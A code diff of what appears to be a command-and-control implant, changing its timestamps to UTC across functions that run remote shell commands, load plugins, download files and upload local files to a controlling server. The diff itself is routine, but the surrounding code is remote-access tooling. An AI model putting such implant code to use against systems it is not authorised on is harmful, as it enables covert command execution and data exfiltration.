@@ -177,7 +177,7 @@ def execute_task(task, task_uuid):
         SLEEP_MAX = task.get("max", SLEEP_MAX)
 
         print(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds")
-        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
         post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds",task_uuid,executed_at)
 
 
@@ -194,14 +194,12 @@ def execute_shell(command, task_uuid):
         )
 
         output = result.decode()
-
-        print(output)
-        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
 
         post_result(output, task_uuid,executed_at)
 
     except subprocess.CalledProcessError as e:
-        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
         post_result("[!] Error: "+e.output.decode(), task_uuid,executed_at)
 
 
@@ -218,17 +216,17 @@ def execute_plugin(content, module_name, task_uuid):
 
         if hasattr(module, "run"):
             module.run()
-            executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
             print(f"[+] Plugin '{module_name}' executed successfully")
             post_result(f"[+] Plugin '{module_name}' executed", task_uuid,executed_at)
         else:
             print(f"[!] Plugin '{module_name}' has no run() function")
-            executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
             post_result(f"[!] Error: Plugin '{module_name}' has no run() function", task_uuid,executed_at)
 
     except Exception as e:
         print(f"[!] Plugin '{module_name}' crashed: {e}")
-        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
         post_result(f"[!] Error: Plugin '{module_name}' crashed: {e}", task_uuid,executed_at)
 
 def download_file(url, save_as=None, task_uuid=None):
@@ -253,20 +251,20 @@ def download_file(url, save_as=None, task_uuid=None):
                 print(f"[!] Plugin '{module_name}' timed out, terminating...")
                 p.terminate()
                 p.join()
-                executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
                 post_result(f"[!] Error: Plugin '{module_name}' aborted due to timeout", task_uuid,executed_at)
         else:
             if save_as is None:
                 save_as = url.split("/")[-1]
             with open(save_as, "wb") as f:
                 f.write(r.content)
-            executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
             post_result(f"Downloaded file {save_as}", task_uuid,executed_at)
 
     except Exception as e:
         print(f"[!] Error: download failed {url}: {e}")
         if task_uuid:
-            executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
             post_result(f"[!] Error: {e}", task_uuid,executed_at)
 
 
@@ -287,7 +285,7 @@ def upload_file(path_to_file, task_uuid):
                 files=files,
                 data=data
             )
-        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
         post_result(
             f"[+] Uploaded {path_to_file} ({response.status_code})",
             task_uuid,executed_at
@@ -296,7 +294,7 @@ def upload_file(path_to_file, task_uuid):
     except Exception as e:
 
         print(f"[!] Upload error: {e}")
-        executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
         post_result(f"[!] Error: Failed to upload : {e}", task_uuid,executed_at)
 
 
